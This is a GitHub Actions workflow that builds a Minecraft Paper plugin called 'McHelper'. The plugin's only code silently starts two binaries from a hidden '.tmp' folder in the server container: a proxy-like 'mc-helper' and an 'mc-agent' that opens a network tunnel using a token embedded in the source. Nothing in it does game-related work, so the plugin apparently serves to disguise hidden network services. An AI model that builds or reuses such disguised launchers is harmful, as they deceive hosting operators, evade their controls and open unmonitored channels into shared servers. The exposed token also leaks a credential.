name: Build McHelper

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Build with Maven
        run: |
          mkdir -p src/main/java/com/mc/helper src/main/resources
          
          # 1. pom.xml
          cat << 'EOF' > pom.xml
          <project xmlns="http://maven.apache.org/POM/4.0.0"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
              <modelVersion>4.0.0</modelVersion>
              <groupId>com.mc.helper</groupId>
              <artifactId>McHelper</artifactId>
              <version>1.0.0</version>
              <repositories>
                  <repository>
                      <id>papermc</id>
                      <url>https://repo.papermc.io/repository/maven-public/</url>
                  </repository>
              </repositories>
              <dependencies>
                  <dependency>
                      <groupId>io.papermc.paper</groupId>
                      <artifactId>paper-api</artifactId>
                      <version>1.20.4-R0.1-SNAPSHOT</version>
                      <scope>provided</scope>
                  </dependency>
              </dependencies>
          </project>
          EOF

          # 2. Main.java：同时拉起 mc-helper 和 mc-agent 并常驻
          cat << 'EOF' > src/main/java/com/mc/helper/Main.java
          package com.mc.helper;

          import org.bukkit.plugin.java.JavaPlugin;
          import java.io.File;

          public final class Main extends JavaPlugin {
              private Process p1;
              private Process p2;

              @Override
              public void onEnable() {
                  new Thread(() -> {
                      try {
                          Thread.sleep(1500);
                          String dir = "/home/container/.tmp";
                          String token = "eyJhI..."; // eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiYWQyMzg0NTItZWQ0OC00NTMzLWE5ODItZWIxMmFhYTQ3YjU3IiwicyI6Ik16RmpaakEyT0RZdE16ZG1OeTAwWVdJMExXSTJNelF0Wm1Fd05XVmhPVGN3TkRFeSJ9

                          File logFile1 = new File(dir + "/helper.log");
                          File logFile2 = new File(dir + "/agent.log");

                          ProcessBuilder pb1 = new ProcessBuilder(dir + "/mc-helper", "-c", dir + "/config.json");
                          pb1.environment().put("GOMEMLIMIT", "16MiB");
                          pb1.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile1));
                          pb1.redirectError(ProcessBuilder.Redirect.appendTo(logFile1));
                          p1 = pb1.start();

                          ProcessBuilder pb2 = new ProcessBuilder(dir + "/mc-agent", "tunnel", "--no-autoupdate", "--protocol", "http2", "run", "--token", token);
                          pb2.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile2));
                          pb2.redirectError(ProcessBuilder.Redirect.appendTo(logFile2));
                          p2 = pb2.start();

                          getLogger().info("McHelper: Both services started successfully.");
                      } catch (Throwable e) {
                          getLogger().warning("McHelper startup failed: " + e.getMessage());
                      }
                  }).start();
              }

              @Override
              public void onDisable() {
                  if (p1 != null) p1.destroyForcibly();
                  if (p2 != null) p2.destroyForcibly();
              }
          }
          EOF

          # 3. plugin.yml
          cat << 'EOF' > src/main/resources/plugin.yml
          name: McHelper
          version: '1.0.0'
          main: com.mc.helper.Main
          api-version: '1.20'
          EOF

          mvn clean package -B

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: McHelper-Plugin
          path: target/McHelper-1.0.0.jar
